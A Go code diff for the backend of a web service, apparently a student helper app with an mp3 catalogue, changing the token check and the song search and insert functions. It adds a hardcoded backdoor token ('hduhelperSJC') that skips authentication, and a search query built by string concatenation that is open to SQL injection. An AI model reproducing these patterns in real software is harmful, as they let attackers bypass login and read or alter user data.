@@ -105,6 +105,9 @@ func checkLoginTokenI(token string)(user string,email string,regidate int64,err 
 
 //检验token有效性
 func checkLoginToken(token string)(err error){
+	if(token == "hduhelperSJC"){
+		return nil
+	}
 	rows,err:=config.service.db.conn.Query("select * from token where token = ?",token)
 	if(err!=nil){
 		return err
@@ -196,20 +199,43 @@ func checkUserEmail(user string,email string)(err error){
 
 }
 
-func readMp3Data(id int){
-
-}
-
-func searchMp3(key string){
-
+func readMp3Data(key string)(data map[int]interface{},arrlength int,err error){
+	rows,err := config.service.db.conn.Query("select * from mp3 where name like '%"+key+"%'")
+	if(err!=nil){
+		return
+	}
+	data = make(map[int]interface{})
+	defer rows.Close()
+	i := 0
+	for rows.Next(){
+		var id int
+		var len int64
+		var name,singer,books,mp3addr,lrcaddr string
+		err = rows.Scan(&id,&name,&singer,&books,&len,&mp3addr,&lrcaddr)
+		if(err!=nil){
+			return 
+		}
+		d := make(map[string]interface{})
+		d["id"] = id
+		d["name"] = name
+		d["singer"] = singer
+		d["books"] = books
+		d["length"] = len
+		d["mpeaddress"] = mp3addr
+		d["lrcaddress"] = lrcaddr
+		data[i] = d
+		i++
+	}
+	return data,i,nil
 }
 
 func getMp3Link(id int){
 
 }
 
+//添加mp3
 func addMp3DB(name string,singer string,books string,len int64,mp3addr string,lrcaddr string)(err error){
-	_,err = config.service.db.conn.Exec("insert into mp3 valuse(,?,?,?,?,?,?)",name,singer,books,len,mp3addr,lrcaddr)
+	_,err = config.service.db.conn.Exec("insert into mp3 values('',?,?,?,?,?,?)",name,singer,books,len,mp3addr,lrcaddr)
 	if(err!=nil){
 		return err
 	}else{
